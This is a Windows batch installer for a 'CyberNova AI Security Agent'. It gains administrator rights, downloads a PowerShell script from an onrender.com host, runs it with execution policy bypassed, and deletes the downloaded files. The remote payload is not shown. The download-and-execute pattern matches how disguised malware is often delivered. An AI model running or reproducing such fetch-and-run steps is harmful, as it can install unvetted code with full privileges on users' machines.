@echo off
title CyberNova AI Security Agent - Enterprise Setup
color 0B

echo.
echo ===============================================
echo    🛡️ CyberNova AI Security Agent
echo    Enterprise Security Installation
echo ===============================================
echo.

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ❌ Administrator privileges required
    echo.
    echo This installer will now restart with administrator privileges...
    echo Please click "Yes" when Windows asks for permission.
    echo.
    pause
    
    :: Restart as administrator
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ✅ Administrator privileges confirmed
echo.
echo 🚀 Starting secure installation process...
echo.

:: Create temporary directory for installation files
set TEMP_DIR=%TEMP%\CyberNova_Install
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

:: Download the secure PowerShell installer
echo [1/3] Downloading secure installer components...
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri 'https://cybernova-launch-api-gateway.onrender.com/installer-download?type=powershell' -OutFile '%TEMP_DIR%\installer.ps1' -UseBasicParsing } catch { Write-Host 'Download failed:' $_.Exception.Message }}"

if not exist "%TEMP_DIR%\installer.ps1" (
    echo ❌ Failed to download installer components
    echo Please check your internet connection and try again
    pause
    exit /b 1
)

echo ✅ Installer components downloaded
echo.

:: Execute the secure PowerShell installer
echo [2/3] Executing secure installation...
powershell -ExecutionPolicy Bypass -File "%TEMP_DIR%\installer.ps1"

:: Cleanup
echo.
echo [3/3] Cleaning up temporary files...
rmdir /s /q "%TEMP_DIR%" 2>nul

echo.
echo ===============================================
echo    🎉 Setup Complete!
echo ===============================================
echo.
echo Your device is now protected with CyberNova Security!
echo.
pause
